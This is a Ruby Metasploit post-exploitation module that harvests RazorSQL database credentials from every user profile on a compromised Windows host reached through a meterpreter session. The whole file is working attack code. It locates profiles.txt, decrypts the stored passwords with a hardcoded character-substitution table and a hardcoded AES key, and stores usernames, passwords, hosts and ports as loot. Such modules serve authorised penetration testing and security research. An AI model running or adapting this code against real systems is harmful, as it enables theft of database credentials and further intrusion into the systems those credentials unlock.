##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'
require 'openssl'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather RazorSQL Credentials',
      'Description'   => %q{
          This module stores username, password, type, host, port, database (and name)
        collected from profiles.txt of RazorSQL.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Paul Rascagneres <rascagneres[at]itrust.lu>',
          'sinn3r' #Reporting, file parser
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def get_profiles
    profiles = []
    grab_user_profiles.each do |user|
      next unless user['ProfileDir']
      ['.razorsql\\data\\profiles.txt', 'AppData\Roaming\RazorSQL\data\profiles.txt'].each do |profile_path|
        file = "#{user['ProfileDir']}\\#{profile_path}"
        profiles << file if file?(file)
      end
    end

    profiles
  end


  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      post_reference_name: self.refname,
      session_id: session_db_id,
      origin_type: :session,
      private_data: opts[:password],
      private_type: :password,
      username: opts[:user]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end


  def run
    print_status("Checking All Users...")
    creds_tbl = Rex::Text::Table.new(
      'Header'  => 'RazorSQL User Credentials',
      'Indent'  => 1,
      'Columns' =>
        [
          'Username',
          'Password',
          'Type',
          'Host',
          'Port',
          'Database Name',
          'Database'
        ]
    )

    get_profiles.each do |profile_path|
      content = get_content(profile_path)
      next if content.blank?
      parse_content(creds_tbl, content).each do |cred|
        creds_tbl << cred
      end
    end

    if creds_tbl.rows.empty?
      print_status("No creds collected.")
    else
      path = store_loot(
        'razor.user.creds',
        'text/csv',
        session,
        creds_tbl.to_s,
        'razor_user_creds.txt',
        'RazorSQL User Credentials'
      )
      print_line(creds_tbl.to_s)
      print_status("User credentials stored in: #{path}")
    end
  end

  def get_content(file)
    found    = session.fs.file.stat(file) rescue nil
    return if not found
    content=''
    infile = session.fs.file.new(file, "rb")
    until infile.eof?
      content << infile.read
    end
    return content
  end

  def parse_content(table, content)
    creds = []
    content = content.split(/\(\(Z~\]/)
    content.each do |db|
      database = (db.scan(/database=(.*)/).flatten[0] || '').strip
      user     = (db.scan(/user=(.*)/).flatten[0] || '').strip
      type     = (db.scan(/type=(.*)/).flatten[0] || '').strip
      host     = (db.scan(/host=(.*)/).flatten[0] || '').strip
      port     = (db.scan(/port=(.*)/).flatten[0] || '').strip
      dbname   = (db.scan(/databaseName=(.*)/).flatten[0] || '').strip
      pass     = (db.scan(/password=(.*)/).flatten[0] ||'').strip

      # Decrypt if there's a password
      unless pass.blank?
        if pass =~ /\{\{\{VFW(.*)!\^\*#\$RIG/
          decrypted_pass = decrypt_v2($1)
        else
          decrypted_pass = decrypt(pass)
        end
      end

      pass = decrypted_pass ? decrypted_pass : pass

      # Store data
      creds << [user, pass, type, host, port, dbname, database]

      # Don't report if there's nothing to report
      next if user.blank? && pass.blank?

      report_cred(
        ip: rhost,
        port: port.to_i,
        service_name: database,
        user: user,
        password: pass
      )
    end

    return creds
  end

  def decrypt( encrypted_password )
    magic_key= {
      "/" => "a" , "<" => "b" , ">" => "c" , ":" => "d" , "X" => "e" ,
      "c" => "f" , "W" => "g" , "d" => "h" , "V" => "i" , "e" => "j" ,
      "f" => "k" , "g" => "l" , "U" => "m" , "T" => "n" , "S" => "o" ,
      "n" => "p" , "m" => "q" , "l" => "r" , "k" => "s" , "j" => "t" ,
      "i" => "u" , "h" => "v" , "P" => "w" , "Q" => "x" , "R" => "y" ,
      "o" => "z" , "p" => "A" , "q" => "B" , "r" => "C" , "t" => "D" ,
      "s" => "E" , "L" => "F" , "M" => "H" , "O" => "I" , "N" => "J" ,
      "J" => "K" , "v" => "L" , "u" => "M" , "z" => "N" , "y" => "O" ,
      "w" => "P" , "x" => "Q" , "G" => "R" , "H" => "S" , "A" => "T" ,
      "B" => "U" , "D" => "V" , "C" => "W" , "E" => "X" , "F" => "Y" ,
      "I" => "Z" , "?" => "1" , "3" => "2" , "4" => "3" , "5" => "4" ,
      "6" => "5" , "7" => "6" , "8" => "7" , "9" => "8" , "2" => "9" ,
      "." => "0" , "+" => "+" , "\"" => "\"" , "*" => "*" , "%" => "%" ,
      "&" => "&" , "Z" => "/" , "(" => "(" , ")" => ")" , "=" => "=" ,
      "," => "?" , "!" => "!" , "$" => "$" , "-" => "-" , "_" => "_" ,
      "b" => ":" , "0" => "." , ";" => ";" , "1" => "," , "\\" => "\\" ,
      "a" => "<" , "Y" => ">" , "'" => "'" , "^" => "^" , "{" => "{" ,
      "}" => "}" , "[" => "[" , "]" => "]" , "~" => "~" , "`" => "`"
    }
    password = ''
    for letter in encrypted_password.chomp.each_char
      char = magic_key[letter]

      # If there's a nil, it indicates our decryption method does not work for this version.
      return nil if char.nil?

      password << char
    end

    password
  end

  def decrypt_v2(encrypted)
    enc = Rex::Text.decode_base64(encrypted)
    key = Rex::Text.decode_base64('LAEGCx0gKU0BAQICCQklKQ==')

    aes = OpenSSL::Cipher.new('AES-128-CBC')
    aes.decrypt
    aes.key = key

    aes.update(enc) + aes.final
  end
end

=begin
http://www.razorsql.com/download.html
Tested on: v5.6.2 (win32)
=end
